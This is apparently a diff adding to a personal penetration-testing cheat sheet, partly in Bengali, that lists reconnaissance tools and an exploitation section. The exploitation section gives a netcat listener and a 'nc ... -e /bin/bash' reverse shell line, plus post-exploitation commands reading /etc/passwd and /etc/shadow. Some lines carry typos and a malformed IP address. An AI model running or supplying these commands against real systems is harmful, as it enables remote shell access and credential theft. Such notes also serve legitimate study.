@@ -12,6 +12,36 @@ wapalyzer  //extension or website
                                ______
 netdiscover ip/24     // for subnet scan
 after we use nmap for 3-wayhand shak //mame -sS meanig stealth scan
-nmap -v -T4/T1/T5/ -p- -A -V ip
+nmap -v -T4/T1/T5/ -p- -A -V i p
 nikto -h ip or website
-gobuster/dirbuster/dirb/burpsuite  
+gobuster/dirbuster/dirb/burpsuite 
+
+after finding open port ,your need to exploit .
+know we are discuss exploit 
+
+
+                                    exploition
+                                    __________
+smbclient -L \\ip\\    -> eta deye smb login kora jay.
+ssh ip
+searchsploit   -> for vulnerality
+
+                                scanning
+                                ________
+nessus tools for vulnerality asignment 
+zaproxy kali tools use automatic scan
+nc nvlp 4444 -> (my macheine)
+nc 192.168.9.0.1 80 -e /bin/bash ->( client site)
+metaexploit
+openLuck (this is use for apache vulnerabality) git repository
+after connecting rce : you will give blew this command
+ifconfig
+arp
+route
+sudo -l 
+cat /etc/passwd
+cat /etc/shadow
+
+
+
+
